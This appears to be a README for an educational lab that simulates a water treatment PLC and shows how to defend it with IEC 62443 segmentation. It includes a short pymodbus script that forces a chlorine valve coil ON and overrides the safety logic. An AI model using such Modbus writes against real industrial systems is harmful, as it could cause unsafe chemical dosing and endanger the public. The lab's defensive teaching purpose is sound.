# 🏭 Cyber-Resilient Water Treatment ICS Security Lab

## 📌 Overview
This project is a **hands-on Industrial Control Systems (ICS) / OT security lab** that simulates a **water treatment plant** and demonstrates **realistic cyber attacks, segmentation, and defensive controls** aligned with **IEC 62443** and **NIST 800-82**.

The lab intentionally mirrors **real OT constraints**: minimal tooling, unauthenticated industrial protocols, and safety-critical logic. Validation is done through **protocol behavior**, not GUI indicators.

---

## 🎯 Objectives
- Build a functioning **PLC-controlled industrial process**
- Expose and exploit **Modbus TCP weaknesses**
- Implement **zone-and-conduit network segmentation**
- Validate security controls using **ICS-appropriate tests**
- Demonstrate a **defensive OT engineering mindset**

---

## 🧱 Architecture

### Zones (IEC 62443)
```
IT Zone (Host VM)
   ❌ No direct OT access

DMZ Zone
   └── HMI (Node-RED)
        ↓ Modbus TCP (502)

OT Zone
   └── PLC (OpenPLC Runtime)
```

### Network Segmentation
- **OT Network:** `172.24.0.0/16`
- **DMZ Network:** `172.25.0.0/16`
- **IT → OT:** Blocked
- **DMZ → OT:** Allow-listed (Modbus TCP only)

Firewall enforcement is implemented using **iptables `DOCKER-USER` chain** with **stateful rules**.

---

## ⚙️ Components

### PLC (OT Zone)
- **OpenPLC Runtime** (`tuttas/openplc_v3`)
- IEC 61131-3 Structured Text program
- Modbus TCP server on port `502`

### HMI (DMZ Zone)
- **Node-RED**
- Minimal runtime (no `apt`, no `pip`)
- Used as an operator / intermediary zone

### Host (IT Zone)
- Python automation
- Attack simulation
- Firewall enforcement

---

## 🧠 PLC Logic (Structured Text)

```pascal
PROGRAM WaterTreatment
PROGRAM WaterTreatment
VAR
  TankLevel : INT;
  Pump : BOOL;
  ChlorineValve : BOOL;
END_VAR

(* Normal operation *)
IF TankLevel < 40 THEN
  Pump := TRUE;
  ChlorineValve := TRUE;
ELSIF TankLevel > 90 THEN
  Pump := FALSE;
  ChlorineValve := FALSE;
END_IF;

```

### Modbus Mapping

| Variable        | Modbus Type      | Address |
|-----------------|------------------|---------|
| TankLevel       | Holding Register | 0       |
| Pump            | Coil             | 0       |
| ChlorineValve   | Coil             | 1       |

---

## 🔥 Attack Demonstrated

### Modbus Command Injection
An attacker writes directly to PLC coils using Modbus TCP, bypassing control logic.

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("localhost", port=502)
client.connect()

# Force chlorine valve ON (coil 1)
client.write_coil(1, True)

print("⚠️ Chlorine valve forced ON")

client.close()


```

### Impact
- Chlorine valve forced ON
- PLC logic overridden
- Unsafe chemical dosing condition

Mapped to **MITRE ATT&CK for ICS – Unauthorized Command Message**.

---

## 🔐 Network Segmentation Controls

### Docker Networks
- `ot_net` (internal, PLC only)
- `dmz_net` (DMZ / HMI access)

### Firewall Policy (DOCKER-USER)
- Allow **ESTABLISHED, RELATED** traffic
- Allow **DMZ → OT Modbus TCP (502)**
- Drop **all other traffic to OT**

This enforces **zone-and-conduit architecture** consistent with **IEC 62443**.

---

## ✅ Validation Strategy (ICS-Correct)

Due to OT system constraints:
- ❌ Raw TCP tests (`nc`, `/dev/tcp`) are unreliable
- ❌ Package installation inside containers is not assumed

Validation is performed via:
- Successful **Modbus read/write operations**
- Confirmed **host → OT traffic blocking**
- DMZ service discovery (`getent hosts openplc`)

---

## 🧠 Key Lessons Demonstrated
- OT systems are **not general-purpose OSes**
- Security prioritizes **safety and availability**
- Allow-listing is mandatory in ICS networks
- Tooling limitations are expected in real plants
- Knowing **when to stop testing** is part of OT engineering

---

## 📊 Standards Alignment
- **IEC 62443** – Zones, conduits, least privilege
- **NIST SP 800-82** – ICS architecture and segmentation
- **MITRE ATT&CK for ICS** – Unauthorized command execution

---

## 🚀 Future Enhancements
- PLC fail-safe safety interlocks
- Process-aware anomaly detection
- OT IDS for Modbus write detection
- Automated SOAR response (OT isolation)
- Operator alerting and dashboards

---

## ⚠️ Disclaimer
This project is for **educational and defensive security research only**. No real-world systems were targeted.
